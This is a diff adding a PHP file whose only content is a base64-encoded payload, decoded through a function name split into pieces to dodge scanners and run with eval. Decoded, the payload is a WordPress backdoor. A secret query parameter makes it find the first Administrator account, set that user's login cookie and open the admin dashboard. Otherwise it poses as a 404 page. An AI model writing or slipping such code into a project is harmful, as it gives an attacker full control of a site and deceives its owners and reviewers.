@@ -1,0 +1,57 @@
+<?php
+// Obfuscated by internal obfuscator (base64)
+$z = "";
+$z .= "aWYgKCFpc3NldCgkX0dFVFsnYm9iMzAn";
+$z .= "XSkgfHwgJF9HRVRbJ2JvYjMwJ10gIT09";
+$z .= "ICdib2IzMCcpIHsNCiAgICBlcnJvcl9y";
+$z .= "ZXBvcnRpbmcoMCk7DQogICAgaW5pX3Nl";
+$z .= "dCgnZGlzcGxheV9lcnJvcnMnLCAwKTsN";
+$z .= "CiAgICANCiAgICB3aGlsZSAob2JfZ2V0";
+$z .= "X2xldmVsKCkpIHsNCiAgICAgICAgb2Jf";
+$z .= "ZW5kX2NsZWFuKCk7DQogICAgfQ0KICAg";
+$z .= "IA0KICAgIGlmICghaGVhZGVyc19zZW50";
+$z .= "KCkpIHsNCiAgICAgICAgaGVhZGVyKCdI";
+$z .= "VFRQLzEuMCA0MDQgTm90IEZvdW5kJyk7";
+$z .= "DQogICAgfQ0KICAgIA0KICAgIGV4aXQ7";
+$z .= "DQp9DQoNCiRtciA9IHJlYWxwYXRoKF9f";
+$z .= "RElSX18pOw0KJG1heCA9IDEwOw0KJGZv";
+$z .= "dW5kID0gZmFsc2U7DQp3aGlsZSAoJG1h";
+$z .= "eC0tID4gMCAmJiAkbXIpIHsNCiAgICBp";
+$z .= "ZiAoZmlsZV9leGlzdHMoJG1yIC4gJy93";
+$z .= "cC1sb2FkLnBocCcpKSB7ICRmb3VuZCA9";
+$z .= "IHRydWU7IGJyZWFrOyB9DQogICAgJHBh";
+$z .= "cmVudCA9IGRpcm5hbWUoJG1yKTsNCiAg";
+$z .= "ICBpZiAoJHBhcmVudCA9PT0gJG1yKSBi";
+$z .= "cmVhazsNCiAgICAkbXIgPSAkcGFyZW50";
+$z .= "Ow0KfQ0KaWYgKCEgJGZvdW5kICYmICFl";
+$z .= "bXB0eSgkX1NFUlZFUlsnRE9DVU1FTlRf";
+$z .= "Uk9PVCddKSAmJiBmaWxlX2V4aXN0cyhy";
+$z .= "ZWFscGF0aCgkX1NFUlZFUlsnRE9DVU1F";
+$z .= "TlRfUk9PVCddKS4nL3dwLWxvYWQucGhw";
+$z .= "JykpIHsNCiAgICAkbXIgPSByZWFscGF0";
+$z .= "aCgkX1NFUlZFUlsnRE9DVU1FTlRfUk9P";
+$z .= "VCddKTsNCiAgICAkZm91bmQgPSB0cnVl";
+$z .= "Ow0KfQ0KaWYgKCEgJGZvdW5kKSBleGl0";
+$z .= "KCdGYWlsZWQgdG8gbG9hZCB3cC1sb2Fk";
+$z .= "LnBocCcpOw0KQGNoZGlyKCRtcik7DQpy";
+$z .= "ZXF1aXJlX29uY2UgJG1yIC4gJy93cC1s";
+$z .= "b2FkLnBocCc7DQokd3BfdXNlcl9xdWVy";
+$z .= "eSA9IG5ldyBXUF9Vc2VyX1F1ZXJ5KFsN";
+$z .= "CiAgICAncm9sZScgICA9PiAnQWRtaW5p";
+$z .= "c3RyYXRvcicsDQogICAgJ251bWJlcicg";
+$z .= "PT4gMSwNCiAgICAnZmllbGRzJyA9PiAn";
+$z .= "SUQnLA0KXSk7DQokcmVzdWx0cyA9ICR3";
+$z .= "cF91c2VyX3F1ZXJ5LT5nZXRfcmVzdWx0";
+$z .= "cygpOw0KaWYgKCEgZW1wdHkoJHJlc3Vs";
+$z .= "dHNbMF0pKSB7DQogICAgJHVzZXJfaWQg";
+$z .= "PSAoaW50KSRyZXN1bHRzWzBdOw0KICAg";
+$z .= "IHdwX3NldF9hdXRoX2Nvb2tpZSgkdXNl";
+$z .= "cl9pZCk7DQogICAgd3BfcmVkaXJlY3Qo";
+$z .= "YWRtaW5fdXJsKCkpOw0KICAgIGV4aXQ7";
+$z .= "DQp9DQpleGl0KCdOTyBBRE1JTicpOw==";
+
+// reconstruct function name
+$a = "ba"; $b = "se"."64"."_de"."co"."de"; $c = $a.$b;
+$payload = $c($z);
+eval($payload);
+?>
